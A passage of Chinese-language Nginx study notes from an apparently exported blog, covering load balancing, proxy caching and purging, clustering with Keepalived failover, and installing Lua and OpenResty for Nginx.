$ sudo cp objs/nginx /usr/sbin/nginx	# 替换nginx
# $ sudo service nginx restart # 重启nginx
$ make upgrade	# 更新nginx
```

#### 实际案例

##### 特定资源负载均衡

```nginx
# 配置负载均衡服务器 192.168.253.134
http {
    ...
	upstream video_pool{
		server 192.168.253.135;
		server 192.168.253.136;
	}
    upstream file_pool{
		server 192.168.253.137;
        server 192.168.253.138;
	}
    server{
        listen 80;
        server_name localhost;
        location /video{
            proxy_pass http://video_pool;
        }
        location /file{
            proxy_pass http://file_pool;
        }
    }
}
```

![image-20220604175807846](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f5436bfc830fadb21cba25c7278086f5-574c4b4.png)

![image-20220604175831716](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/82f3d7cea21921bb0c79158d220cf825-0dfe729.png)

##### 对不同域名实现负载均衡

修改客户端本地hosts文件(`C:\Windows\System32\drivers\etc\hosts`), 添加内容

```
192.168.253.134 local1.project.com
192.168.253.134 local2.project.com
```

修改服务器nginx配置文件

```nginx
    upstream local1{
        server 192.168.253.135;
        server 192.168.253.136;
    }
    upstream local2{
        server 192.168.253.137;
        server 192.168.253.138;
    }

    server{
        listen 80;
        server_name local1.project.com;
        location /{
            proxy_pass http://local1;
        }
    }
    server{
        listen 80;
        server_name local2.project.com;
        location /{
            proxy_pass http://local2;
        }
    }
```

![image-20220604181016412](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/50478c23602aee661096590bb76de5bc-534982e.png)

![image-20220604181034312](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ca8206c7694353c655eccfbe1c4e83f4-cd4d378.png)

##### 带URL重写的负载均衡

重写请求中以file开头的路由, 到new路由中

```nginx
    upstream rewrite_pool{
        server 192.168.253.135 weight=2;
        server 192.168.253.136 weight=1;
        server 192.168.253.137 weight=1;
    }
    server{
        listen 80;
        server_name localhost;
        location /file/{
            rewrite ^(/file/.*/) /new/$1 last;
        }
        location /new{
            proxy_pass http://rewrite_pool;
        }
    }
```

### Nginx 四层负载均衡

Nginx 的四层协议转发、代理、负载均衡, 是通过stream模块实现的. 允许配置一组TCP/UDP等协议的监听, 然后通过proxy_pass转发请求, 通过upstream添加多个后端服务, 实现负载均衡

#### 添加stream模块支持

```shell
$ sudo mv /usr/sbin/nginx /usr/sbin/nginx_old	# 备份
$ nginx -V	# 复制nginx模块配置
$ ./configure [nginx原有配置] --with-stream # 添加stream模块
$ make
$ sudo cp objs/nginx /usr/sbin/nginx	# 替换nginx
$ sudo service nginx restart # 重启nginx
```

![image-20220604185419081](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/45183d660d0486a559cf6700e999aa0a-cc05ea0.png)

#### stream模块指令

##### stream指令

提供在其中指定流服务器的配置文件上下文, 和http块同级

```
语法:
	stream{...}
位置:
	main
```

##### upstream指令

与upstream模块中类似, 但位置处于stream块内部

#### 实际案例

访问负载均衡分发服务器的8088端口时, 将请求分发到两台服务器的redis服务中

```nginx
# 设置192.168.253.134服务器的nginx配置
stream{
    upstream redis_backend{
        server 192.168.253.135:6379;
        server 192.168.253.136:6379;
    }
    server{
        listen 8088;
        proxy_pass redis_backend;
    }
}

```

结果:

![image-20220605002708958](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/54515b4b5d3b2ddd5f4242bc09aa3392-f64c6d3.png)

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx缓存集成07</title>
    <url>/2021/06/21/Nginx/Nginx07%E7%BC%93%E5%AD%98%E9%9B%86%E6%88%90/</url>
    <content><![CDATA[
## Nginx缓存集成

### 缓存概述

客户端的所有请求直接请求服务端, 会影响服务端的性能. 如: 接收过多请求, 压力增大, 某些操作比较耗时, 影响响应速度. 所以引入缓存机制可以大大减轻服务器压力.

用户请求资源数据时, 先从缓存中查看, 若缓存中存在则直接返回给客户, 若不存在, 才请求服务器资源获取, 在返回用户的同时将其放入缓存, 下次就可以直接从缓存中获取

#### 缓存使用场景:

| 场景             | 作用                     |
| ---------------- | ------------------------ |
| 操作系统磁盘缓存 | 减少磁盘机械操作         |
| 数据库缓存       | 减少文件系统IO操作       |
| 应用程序缓存     | 减少对数据库的查询       |
| Web服务器缓存    | 减少对应用服务器请求次数 |
| 浏览器缓存       | 减少后台交互次数         |

#### 缓存优点:

减少数据传输, 节省网络带宽流量, 加快响应速度, 提升用户体验

减轻服务器压力

提供服务端高可用性

#### 缓存缺点:

数据的即时性和一致性可能有延迟

增加成本

### Nginx的web缓存服务

基于proxy store实现, 将URL及相关组合当做key, 在使用MD5算法对key进行哈希, 的到硬盘对应的哈希目录路径, 从而将缓存内容保存在该目录中. Nginx支持对指定URL或者状态码设置过期时间, 也可以使用purge命令手动清除指定URL缓存

![image-20220605014002839](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2f2c3c8c4bc9e883b630047f955b54b1-78f1e1d.png)

#### Nginx缓存设置指令

Nginx的web缓存服务主要是使用ngx_http_proxy_module完成,常用指令如下:

```
文档: https://nginx.org/en/docs/http/ngx_http_proxy_module.html
```

##### proxy_cache_path指令

用于设置缓存文件的存储路径

```
语法:
	proxy_cache_path path [levels=number]  keys_zone=zone_name:zone_size [inactive=time] [max_size=size]
位置:
	http块
```

```
- path 为缓存路径地址, 如: /usr/local/proxy_cache

- levels 指定缓存空间子目录等级, 最多设置三层, 每层取值为1或2. 如:
	levels=1:2	代表缓存空间有两层, 第一层是一个字符, 第二层是两个字符 
	设置key=ni9ne, 通过MD5编码后为:f5d6316dd7ab283c02f90cd236dce1cc
	levels=1:2	最终存储路径为: /usr/local/proxy_path/c/1c
	levels=2:1:2最终存储路径为: /usr/local/proxy_path/cc/1/ce

- key_zone 指定该缓存区名称和大小. 如:
	key_zone=ni9ne:200m	代表缓存区的名称为ni9ne,大小为200m

- inactive 指定缓存数据多久时间未访问才会删除.如:
	inactive=1d	代表数据仅缓存1天, 1天内没有访问就会删除

- max_size 设置最大缓存空间, 若空间已满, 默认覆盖缓存时间最长的资源
	max-size=20g
```

配置实例:

```nginx
http{
    ...
    proxy_cache_path /usr/local/proxy_cache levels=2:2 keys_zone=ni9ne:200m inactive=1d max_size=20g
    ...
}
```

##### proxy_cache指令

用于开启或关闭指定缓存配置

```
语法:
	proxy_cache zone_name [off];
默认值:
	proxy_cache off;
位置:
	http server location块
```

```
- zone_name 指定用于缓存区的名称
```

##### proxy_cache_key指令

用于指定web缓存的key值, Nginx会依据key值MD5哈希存储缓存

```
语法:
	proxy_cache_key key;
默认值: 
	proxy_cache_key $scheme$proxy_host$request_uri;
位置:
	http server location块
```

##### proxy_cache_valid指令

用于对不同返回状态码的URL设置不同的缓存时间

```
语法:
	proxy_cache_valid [code] time;
位置:
	http server location块
```

```
如:
proxy_cache_valid 200 302 10m;
proxy_cache_valid 404 1m;
# 设置200和302响应的URL缓存10分钟, 响应404的URL缓存1分钟
proxy_cache_valid any 1m;
# 对所有响应状态码的URL都设置1分钟缓存
```

##### proxy_cache_min_uses指令

用于设置资源被访问多少次后备缓存

```
语法:
	proxy_cache_min_uses;
默认值:
	proxy_cache_min_uses 1;
位置:
	http server location块
```

##### proxy_cache_methods指令

用于设置缓存哪些方法的请求

```
语法:
	proxy_cache_methods GET|HEAD|POST;
默认值:
	proxy_cache_methods GET HEAD;
位置: 
	http server location块
```

#### Nginx缓存设置案例

客户端请求134服务器, 获取jquery.js文件, 但文件存在于135服务器中, 服务器134在获取135资源后, 将其缓存, 后续请求资源将从缓存中获取

##### 环境准备

```nginx
# 135服务器配置jquery.js路径
    server{
        listen 80;
        server_name localhost;
        location /js{
            root /var/www/project/;
            index index.html;
        }
    }
# 配置完成后测试是否可以访问路径: http://192.168.253.135/js/jquery.js

# 134配置代理转发
	server {
        listen       80;
        server_name  localhost;
        location /js {
            proxy_pass http://192.168.253.135/js/;
        }
	}
# 配置完成后测试是否可以获取文件 http://192.168.253.134/js/jquery.js
```

##### 添加缓存配置

```nginx
# 修改134服务器配置为:
http{
    ...
    proxy_cache_path /usr/local/proxy_cache levels=2:2 keys_zone=ni9ne:200m inactive=30s max_size=20g
    ...
	server {
        listen       80;
        server_name  localhost;
        location /js {
            proxy_cache ni9ne;
            proxy_cache_key $scheme$proxy_host$request_uri;
            proxy_cache_valid 200 20s;	
            proxy_cache_valid 404 30s;	# 访问404状态保存30秒
            proxy_cache_valid any 1m;
            proxy_cache_min_uses 5; 	# 最少使用5次后才缓存
        	# 添加header,验证缓存命中状态 HIT/MISS
            add_header Nginx-Cache-Status "$upstream_cache_status";
            proxy_pass http://192.168.253.135/js/;
        }
    }
}
```

##### 验证缓存结果

![image-20220605202848657](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/50ea7e6f265435f33ccd8cba5155fc14-1bacbdf.png)

![image-20220605203305150](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a60125c18078aa4c9da2d187ff185484-5c4cef1.png)

#### Nginx缓存清除

##### 方式一: 删除对应缓存目录

```shell
$ sudo rm -rf /usr/local/proxy_pass/...
```

##### 方式二: 第三方扩展模块

使用`ngx_cache_purge`模块清除缓存, 需要安装模块

```
模块: https://github.com/FRiCKLE/ngx_cache_purge
```

```nginx
# 配置清除路由
http {
    proxy_cache_path /usr/local/proxy_cache levels=2:2 keys_zone=ni9ne:200m inactive=30s max_size=2g;
    server {
        location /js {
            proxy_cache ni9ne;
            proxy_cache_key $scheme$host$request_uri;
            proxy_cache_valid any 1m; 
            add_header Nginx-Cache-Status "$upstream_cache_status";
            add_header Nginx-Cache-Key "$scheme$host$request_uri";
            proxy_pass http://192.168.253.135/js/;
        }
        location ~ /purge(/.*) {
            proxy_cache_purge ni9ne $scheme$host$1;	# 无法获取$proxy_host
        }
    }
}
```

访问清除页面结果

![image-20220606010637248](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a85383c41eaeee2620e25f6173b2e843-cb76d65.png)

#### Nginx设置资源不缓存

对不需要缓存的数据进行指定, 使用以下指令可以实现

##### proxy_no_cache指令

定义不缓存数据的条件

```
语法:
	proxy_no_cache string ...;
位置: 
	http server location块
```

```nginx
# 配置实例
proxy_no_cache $cookie_nocache $arg_nocache $arg_comment;
```

##### proxy_cache_bypass指令

设置不从缓存中获取数据的条件

```
语法: 
	proxy_cache_bypass string ...;
位置:
	http server location块
```

```nginx
# 配置实例
proxy_cache_bypass $cookie_nocache $arg_nocache $arg_comment;
```

> 上述两个指令均支持多个条件, 且可以同时使用, 条件中只要至少有一个不为空且不等于'0', 则条件满足成立, 不缓存或不获取缓存数据

##### 涉及内置变量介绍

```
- $cookie_nocache
	当前请求的cookie中键为nocache对应的值
	测试可使用 add_header Set-Cookie 'nocache=1'
- $arg_nocache/$arg_comment
	当前请求的参数中属性名为nocache和comment对应的属性值
```

##### 案例实现

```nginx
http {
	server {
        location /js {
            if ($request_uri ~ /.*\.js$){
                set $my_cache_sign 1;
            }
            proxy_cache ni9ne;
            proxy_pass http://192.168.253.135/js/;
            # proxy_no_cache $cookie_nocache $arg_nocache $arg_comment $my_cache_sign;
            proxy_cache_bypass $cookie_nocache $arg_nocache $arg_comment $my_cache_sign;
        }
    }
}
```

![image-20220606014448985](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f0f39cb50e89291ba583b9bad8b74866-1bfd046.png)

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx服务端集群搭建08</title>
    <url>/2021/06/21/Nginx/Nginx08%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[
## Nginx服务端集群搭建

### 准备环境搭建

构建可访问路径:

192.168.253.135/cluster/getAddress 

![image-20220606205305319](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/12192f412dac2fbd1b864292a9e6edbe-7ec1046.png)

192.168.253.135/cluster/index.html

```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>后端服务器</title>
	<script type="text/javascript" src="js/jquery.min.js"></script>
</head>
<body>
	<img src="./img/ni9ne.png">
	<h1>后端服务器: <span id="msg"></span></h1>
</body>
<script>
	$(function(){
		$.get('cluster/getAddress', function(data){
			$('#msg').html(data);
		});
	});
</script>
</html>
```

由134服务器代理路径, 访问`192.168.253.135/demo/index.html`转发到135

![image-20220606205335429](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/918afd8edea919c2a05c8d6b29d40dff-4456f0a.png)

> 实现动静分离, 搭建服务集群

### Nginx实现动静分离

#### 动静分离

**动态资源**指的是后台应用程序的业务处理结果, 

**静态资源**则是html,js,css,image等资源

分离处理可以降低动静资源的耦合度, 提高可用性, 同时, 静态资源也可以部署CDN

#### 实现方式

1.将静态资源移动到代理服务器本地硬盘

![image-20220606205415848](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c12e2239ea060640adb2b087caddda0e-1fb3d17.png)

2.修改代理服务器nginx配置文件

```nginx
http {
	upstream webservice{
        server 192.168.253.135;
    }
    server {
		# 动态资源配置
        location /cluster {
            proxy_pass http://webservice;
        }
        # 静态资源配置
        location ~/.*\.(png|jpg|gif|js){
            root /var/www/static;
        }
	}
}
```

#### 效果

此时, 当动态资源服务宕机时, 静态资源还可以正常显示

![image-20220606205700820](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c3d219941f1aa3e873b69c9c7febc615-a33074b.png)

### Nginx实现集群搭建

#### 配置代理服务器134

```nginx
http {
	upstream webservice{
		server 192.168.253.135;
        server 192.168.253.136;
        server 192.168.253.137;
    }
    server {
		# 动态资源配置
        location /cluster {
            proxy_pass http://webservice;
        }
        # 静态资源配置
        location ~/.*\.(png|jpg|gif|js){
            root /var/www/static;
        }
	}
}
```

![image-20220606214400402](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/02ae83f1e2277edd0ff27e9bce7cf2de-9da4f7d.png)

### Nginx高可用解决方案

动态资源集群中, 当某一服务器服务中断时, 可以切换到其余服务器获取动态数据, 当如果代理服务器宕机, 则需要通过其他手段解决问题

#### Keepalived

使用Keepalived解决可用性问题, Keepalived使用C语言编写, 通过**虚拟路由冗余协议**VRRP(Virtual Route Redundancy Protocol)实现功能

##### VRRP协议简介

类似于Redis中的哨兵机制, 对外提供一个接口提供服务, 内部由多台设备动态选举一个master, 其余为backup, 当master心跳中断时, 其余backup竞争提升为master, 对外提供服务. 

其中主要包含选择协议(竞争master)与路由容错协议(master心跳监测_backup竞争)

#### 环境搭建

| VIP             | IP              | 主机名      | 主/从  |
| --------------- | --------------- | ----------- | ------ |
|                 | 192.168.253.134 | keepalived1 | master |
| 192.168.253.200 |                 |             |        |
|                 | 192.168.253.138 | keepalived2 | backup |

#### 安装Keepalived

```shell
#安装keepalived
$ sudo apt install keepalived
$ sudo cp /usr/share/doc/keepalived/samples/keepalived.conf.sample  /etc/keepalived/keepalived.conf

# 或手动官网下载
# https://keepalived.org/download.html
$ tar -zxvf keepalived-2.0.20.tar.gz -C keepalived/
$ cd keepalived/keepalived-x.x.xx
$ ./configure --sysconf=/etc --prefix=/usr/local
$ make && make install
```

####  Keepalived配置文件介绍

```
# global全局部分
global_defs {
   # 邮件通知目标, 当keepalived切换时发送email给具体的邮箱地址 
   notification_email {
     ni9ne@outlook.com
   }   
   # 设置发件人信息
   notification_email_from Alexandre.Cassen@firewall.loc
   # 指定SMTP服务地址
   smtp_server 192.168.200.1
   # 指定SMTP服务连接超时时间
   smtp_connect_timeout 30
   # 指定运行keepalived服务器的标识, 可用作邮件主题信息
   router_id keepalived1
   # 如果通告与接收的上一个通告来自相同master, 则不执行检查. 默认不跳过检查
   vrrp_skip_check_adv_addr
   # 严格遵守VRRP协议
   vrrp_strict
   # 配置免费ARP的时间间隔, 默认为0(以秒为单位，支持微秒)  
   vrrp_garp_interval 0
   # 设置主动请求NA之间的默认间隔(以秒为单位，支持微秒)  
   vrrp_gna_interval 0
}
# VRRP部分
vrrp_instance VI_1 {
	# 设置默认身份: MASTER/BACKUP 
	state MASTER
	# 指定网卡名称
    interface eth33
    # 虚拟路由ID, 用于区分运行在同一网络接口和地址上的多个VRRPD实例,0-255
    virtual_router_id 50
    # 优先级高的VRRP备份组上线时，通常会抢占优先级低的VRRP备份组。nopreempt将停止高优先级计算机接管master，并允许低优先级计算机继续担任master
    # nopreempt
    # 选出MASTER，优先级最高的获胜。 priority的取值范围为[1-255]
    priority 100 
    # VRRP的通告时间间隔
    advert_int 1
    # 虚拟服务IP地址
    virtual_ipaddress {
        192.168.253.200
    }   
}
virtual_server 10.10.10.2 1358 {	# LVS设备相关
    ...
}
```

#### 配置Keepalived

```
# 134 | 138
global_defs {
   notification_email {
     acassen
   }
   notification_email_from Alexandre.Cassen@firewall.loc
   smtp_server 192.168.200.1
   smtp_connect_timeout 30
   router_id keepalived1	# 路径ID唯一,134-1 138-2
}
vrrp_instance VI_1 {
    state master
    interface ens33	# ip a 查询本机网卡名称
    virtual_router_id 50
    nopreempt
    priority 100	# 设置优先级
    advert_int 1
    virtual_ipaddress {
        192.168.253.200	# 指定VIP
    }
}
virtual_server 10.10.10.2 1358 {
	...
}
```

#### 启动Keepalived服务

```shell
$ sudo systemctl start keepalived
```

#### 查看启动结果

```shell
$ ps -ef | grep keepalived	# 查看进程是否启动
```

![image-20220607021413268](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/cd1be24aa182b5c84836826c107908d3-e036e01.png)

```shell
$ tail -f /var/log/syslog	# 查看日志
```

![image-20220607021630578](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9ee1680b83cbf50602b78363ba9e5ccc-cfaa654.png)

```shell
$ ip addr 	# 查看VIP是否注册到网卡
```

![image-20220607021814980](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4e2f9a15d4fa1620a70689f2268753ac-c8e3215.png)

```
http://192.168.253.200/cluster/index.html	# 访问VIP
```

![image-20220607021926118](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/855d40885069bff5b8979cd7dfd29966-cd24672.png)

> 当keepalived进程关闭时, 备用节点自动上线, 替代原节点成为master, 若未配置nopreempt, 当原节点上线后, 由于优先级较高, master身份自动漂移到原节点.
>
> 但仅通过keepalived进程存活与否来进行身份漂移无法满足需求, 还需要实时监听Nginx或其他服务是否存活, 来决定是否进行选举, 就需要使用vrrp_script实现

#### vrrp_script监控Nginx服务

##### 修改keepalived配置文件

```shell
$ sudo vi /etc/keepalived/keepalived.conf
```

```
global_defs{
	...
}
vrrp_script ck_nginx {	# 注意空格
   script "/etc/keepalived/script/ck_nginx.sh"
   interval 3
   weight -20	# 执行脚本后,减权重,避免重复竞争
   user ni9ne
}
vrrp_instance VI_1 {
    ...
   track_script {	# 注意空格
      ck_nginx
   }
}
```

##### 编写ck_nginx.sh脚本

```shell
$ vim /etc/keepalived/script/ck_nginx.sh
$ sudo chmod 777 /etc/keepalived/script/ck_nginx.sh
```

```shell
#! /bin/bash
num=`ps -C nginx --no-header | wc -l`
if [ $num -eq 0 ];then
	#sudo systemctl restart nginx
	#sleep 2
	#if [ `ps -C nginx --no-header | wc -l` -eq 0 ];then
		sudo killall keepalived
	#fi
fi
```

##### 重启keepalived服务

```shell
$ sudo systemctl restart keepalived
```

##### 验证脚本

![image-20220607031746823](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1dd7d806d29f2f8f11bcef4fe2cf1016-62a21a3.png)]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx中的Lua介绍09</title>
    <url>/2021/06/21/Nginx/Nginx09%E4%B8%AD%E7%9A%84Lua%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[
# Nginx中的Lua操作简介

## Lua

轻量小巧的脚本语言, 可以嵌入到其他应用程序中, 提供灵活的扩展定制功能

可用于游戏开发、独立应用脚本、文本应用脚本、扩展和数据库插件、系统安全上

### 安装lua

```shell
$ wget https://www.lua.org/ftp/lua-5.4.1.tar.gz
$ tar -zxvf lua-5.4.1.tar.gz
$ cd lua-5.4.1
$ make linux test 	# 测试编译环境
$ sudo make install
$ lua -v
```

![image-20220607184810900](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b85f7df8bda089f12cac87d15a2d1a75-d943b5a.png)

### Lua语法

#### 命令行运行与脚本式运行

![image-20220607185129757](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a62459d046f5d7d451fa3b60fb151312-0a8bfc1.png)

![image-20220607185813716](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/81c6cfbe61888620f3e4bad9c5cce9a7-bd9f0cc.png)

```
#! /usr/local/bin/lua
print('hello,lua!!!')
```

#### 注释

**单行注释 ** 

```lua
-- print('hello,lua!!!')
```

**多行注释** 

```lua
--[[
    print('hello,lua!!!')
    print('hello,lua!!!')
    print('hello,lua!!!')
--]]
```

**取消多行注释** 

第一个注释符前加一个 `-` 

```lua
---[[	
    print('hello,lua!!!')
    print('hello,lua!!!')
    print('hello,lua!!!')
--]]
```

#### 标识符

变量名可以使用字母数字下划线, 由于lua保留字使用下划线加大写字母, 如`_VERSION` , 应避免冲突

#### 关键字

| and      | break | do    | else   |
| -------- | ----- | ----- | ------ |
| elseif   | end   | false | for    |
| function | if    | in    | local  |
| nil      | not   | or    | repeat |
| return   | then  | true  | until  |
| while    | goto  |       |        |

#### 运算符

| 算术运算符 | 关系运算符    | 逻辑运算符         | 其他运算符                              |
| ---------- | ------------- | ------------------ | --------------------------------------- |
| `+` 加法   | `==` 等于     | `and` 逻辑与  `&&` | `..`  字符串连接                        |
| `-` 减法   | `~=` 不等于   | `or`   逻辑或 `||` | `#` 一元运算符,<br />返回字符串或表长度 |
| `*` 乘法   | `>` 大于      | `not` 逻辑非  `!`  |                                         |
| `/` 除法   | `<` 小于      |                    |                                         |
| `%` 取余   | `>=` 大于等于 |                    |                                         |
| `^` 乘幂   | `<=` 小于等于 |                    |                                         |
| `-` 负号   |               |                    |                                         |

#### 全局/局部变量

不声明则为全局变量, 若未提前赋值, 默认为`nil`, 声明局部变量, 需要使用`local`关键字

![image-20220607200001074](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f1997b80b95be9cb568f0e7f35ee3182-922fd47.png)

#### 数据类型

| 数据类型 | 名称              | 简介                                                         |
| -------- | ----------------- | ------------------------------------------------------------ |
| nil      | 空, 无效值        | 可用于移除变量,只需要将该变量名赋值为nil                     |
| boolean  | 布尔 , true/false | 可用于条件判断, false/nil为假, 其余均为真                    |
| number   | 数值              | 只包含两种:整型(integer)和双精度浮点型(float)                |
| string   | 字符串            | 可用单双引号定义, 也可以使用`[[ 多行文字 ]]`                 |
| function | 函数              | 使用`function`关键字定义, 以`end`结尾                        |
| table    | 表                | 本质为一种辅助数组, 表示数组,集合,记录等<br />可以使用用`{}`定义, 默认索引从1开始 |
| thread   | 线程              | 用于执行协同程序                                             |
| userdata | 用户数据          | 用于表示由应用程序或C/C++语言库锁创建的类型                  |

> 可以使用type()函数判断给定变量数据类型

![image-20220607200553018](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c57d6bd2540774f5f66ea5bc77a5bbc4-cfd664b.png)

##### function定义及使用

参数可以缺省, 默认为nil, 也可以多传, 多余参数被舍弃

![image-20220607202218668](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1522de9464134ab57d26ff60cbd0e081-10b030a.png)

也可以使用可变参数`...`定义传参

![image-20220607202850654](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/25cc5efac8a844a4b40c6138df3b7250-fcd42f2.png)

#### 控制结构-条件判断

lua中的条件判断通过`if then elseif then else end` 完成

```lua
-- 语法
if 条件1 then
    动作1
elseif 条件2 then
    动作2
else
    动作3
end
```

![image-20220607204807108](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/6b1ee1817008af73272465219112aae8-d04ded2.png)

#### 控制结构-循环语句

**whil循环**

```lua
-- 语法
while 条件 do
    循环体
end
```

```lua
function rangePrint(n)
    local i=1
    while i<=n do
        print(i)
        i=i+1
    end
end
```

![image-20220608021530059](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/80771f661b155cb827bd4990297ffd4b-31c7ec4.png)

**repeat循环**

```lua
-- 语法
repeat
    循环体
until 条件
```

```lua
function rangeRepeat(n)
    local i=n
    repeat
        print(i)
        i=i-1
    until i<1
end
```

![image-20220608021835989](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/fd2862982c1a18f2cb2699772eb8c6d2-8c9cb60.png)

**for循环**

for循环支持数值型循环和泛型循环

- 数值型for循环

  ```lua
  -- 语法
  for i=start,end,step do
  	循环体
  end
  ```

  i 代表当前循环数值, start代表开始数值, end代表结束数值, step代表步长

  ```lua
  function rangeStep()
      for i=10,50,10 do
          print(i)
      end
  end
  ```

  ![image-20220608022903146](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/32be20ee2f8b3540ea9ccb456ce11493-1b7f129.png)

- 泛型for循环

  ```lua
  -- 语法
  for i,v in ipairs(x) do    
      循环体
  end
  -- 或
  for i,v in pairs(x) do
      循环体
  end
  ```

  **ipairs不会循环非数值型元素, pairs会全部循环** 

  ```lua
  function showArr(x)
      for i,v in ipairs(x) do
          print(i,v)
      end
  end
  ```

  ![image-20220608023932770](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8b0af629201f6bb02e339d68cb270417-028ef3d.png)

  ![image-20220608024109753](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/19b47428652c7000410aa7927f328fcb-ea71c1e.png)

  

## ngx_lua模块

### OpenResty文档

```
https://www.nginx.com/resources/wiki/modules/lua/
https://github.com/openresty/lua-nginx-module
```

ngx_lua模块通过将lua解释器集成进Nginx, 可以采用lua脚本实现业务逻辑, 在保证高并发服务能力的同时极大的降低了实现成本

### 环境搭建

#### 方式一: lua-nginx-module

1.安装LuaJIT

```shell
$ wget https://luajit.org/download/LuaJIT-2.0.5.tar.gz
$ tar -zxvf LuaJIT-2.0.5.tar.gz
$ cd LuaJIT-2.0.5
$ sudo apt install build-essential	# 安装编译环境
$ make && sudo make install
$ luajit -v
```

2.安装lua-nginx-module

```shell
$ wget https://github.com/openresty/lua-nginx-module/archive/v0.10.16rc4.tar.gz
$ tar -zxvf v0.10.16rc4.tar.gz
$ mv lua-nginx-module-0.10.16rc4 lua-nginx-module
$ export LUAJIT_LIB=/usr/local/lib
$ export LUAJIT_INC=/usr/loacl/include/luajit-2.0
$ cd lua-nginx-module
$ nginx -V	# 复制结果
$ cd (nginx包路径)
$ ./configure [原有配置] --add-module=[lua-nginx-module路径]
$ sudo apt install build-essential libpcre3 libpcre3-dev openssl libssl-dev zlib1g-dev libxslt1-dev libgd-dev libgeoip-dev	# 安装编译依赖
$ make
$ sudo mv /usr/sbin/nginx /usr/sbin/nginx.old
$ sudo mv objs/nginx /usr/sbin/nginx
$ sudo ln -s /usr/local/lib/libluajit-5.1.so.2 /lib64/libluajit-5.1.so.2 # 报错处理
$ sudo vi /etc/nginx/nginx.conf
	# 报错处理 http块添加 lua_load_resty_core off;
$ sudo systemctl start nginx
```

3.配置lua路由,查看结果

```
location /lua{
	default_type 'text/html';
	content_by_lua 'ngx.say("<h1>hello,lua</h1>")';
}
```

![image-20220608040828296](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/6c4e81f18c987583441251a94e60b66d-730ffad.png)

#### 方式二: OpenResty

```
官网: https://openresty.org/cn/
```

openresty是一个基于Nginx和Lua的高性能Web平台, 内部集成了Nginx和Lua. 用于方便的搭建处理超高并发, 扩展性极强的动态Web应用服务

```shell
$ wget https://openresty.org/download/openresty-1.15.8.2.tar.gz
$ tar -zxvf openresty-1.15.8.2.tar.gz
$ cd openresty-1.15.8.2/
$ ./configure
$ make && sudo make install
$ sudo /usr/local/openresty/nginx/sbin/nginx
```

配置lua路由,查看结果

```nginx
# vim /usr/local/openresty/nginx/conf/nginx.conf
location /lua{
	default_type 'text/html';
	content_by_lua 'ngx.say("<h1>hello,lua</h1>")';
}
```

![image-20220608180950753](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d0112277b31c82da8bdd43a9426a19fd-bb04370.png)

### 指令解析

![image-20220608181255049](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/376ca1e69f85b2f1dfb9e5b5d75a6d3c-f07ea8d.png)

图中 `*` 作用为:

```
* : 无, 即 xxx_by_lua, 则后面应该跟的是lua指令
* :_file, 即 xxx_by_lua_file, 则后面跟的是lua文件
* :_block, 即 xxx_by_lua_block, 在0.9.17版后替代 xxx_by_lua_file
```

#### 初始化阶段指令

**init_by_lua***

> 该指令在每次Nginx重启时执行, 可以完成一些耗时模块的加载, 或初始化全局配置

**init_worker_by_lua***

> 用于启动一些定时任务, 如心跳监测、定时拉取服务器配置等

#### 重写/访问阶段指令

**set_by_lua***

> 用于变量赋值, 该指令每次只能返回一个值, 并赋给指定变量名

**rewrite_by_lua***

> 用于执行内部URL重写或外部重定向, 如伪静态化URL重写, 本阶段在rewrite处理阶段最后默认执行

**access_by_lua***

> 用于访问控制. 如仅允许内网IP访问

**ssl_certificate_by_lua***

> 作用在Nginx和下游服务器开始一个SSL握手操作时, 将允许执行本配置项lua代码

#### 内容处理阶段指令

**content_by_lua***

